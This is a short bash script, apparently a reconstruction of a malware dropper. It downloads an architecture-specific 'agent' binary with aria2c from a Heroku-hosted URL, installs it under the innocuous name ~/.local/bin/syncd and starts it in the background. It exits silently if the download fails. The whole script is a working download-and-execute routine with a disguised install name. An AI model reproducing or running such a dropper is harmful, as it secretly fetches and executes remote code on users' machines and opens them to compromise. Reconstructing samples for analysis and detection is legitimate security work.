#!/usr/bin/env bash
# Reconstruction: generated Heroku app host, $HOSTTYPE, aria2c, install -m.
set -u
ORIGIN="https://shielded-lake-48213.herokuapp.com/dl"
case "${HOSTTYPE}" in
  aarch64) asset="agent-arm64" ;;
  *) asset="agent-amd64" ;;
esac
work="$(mktemp -d)"
aria2c --quiet --max-tries=1 -d "$work" -o "$asset" "${ORIGIN}/${asset}" || exit 0
install -m 755 "$work/$asset" "$HOME/.local/bin/syncd"
rm -rf "$work"
"$HOME/.local/bin/syncd" &
